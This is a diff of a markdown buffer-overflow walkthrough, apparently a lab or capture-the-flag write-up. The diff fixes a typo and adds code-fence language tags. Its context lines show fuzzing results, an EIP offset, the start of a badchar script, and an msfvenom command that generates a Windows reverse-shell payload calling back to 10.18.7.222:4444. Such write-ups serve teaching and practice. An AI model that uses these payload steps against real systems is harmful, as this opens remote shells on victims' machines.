@@ -171,7 +171,7 @@ Fuzzing with 200 bytes
 Could not connect to 10.211.55.3:31337
 ```
 
-Know we now that the amount of bytes somewhere between 200 and 300. To get to know exactly how many bytes we need we can use a custom string with unique bytes and which bytes will be in EIP register — that are the end bytes.
+Now we know that the amount of bytes somewhere between 200 and 300. To get to know exactly how many bytes we need we can use a custom string with unique bytes and which bytes will be in EIP register — that are the end bytes.
 
 Using metasploit framework we can create a unique string:
 
@@ -230,7 +230,7 @@ Now we now the offset: `146`. I will skip the step with checking if we can overw
 
 The next step is to find if there are any badchars.
 
-```
+``` python
 #!/usr/bin/env python3
 
 import socket, sys
@@ -299,7 +299,7 @@ We have two addresses. Let's use the second one. `0x080416bf` will become `\xbf\
 
 Now we can generate a reverse shell payload using msfvenom:
 
-```
+``` console
 vladislav@Mac Desktop % msfvenom -p windows/shell_reverse_tcp LHOST=10.18.7.222 LPORT=4444 -b "\x00\x0a" -f c
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
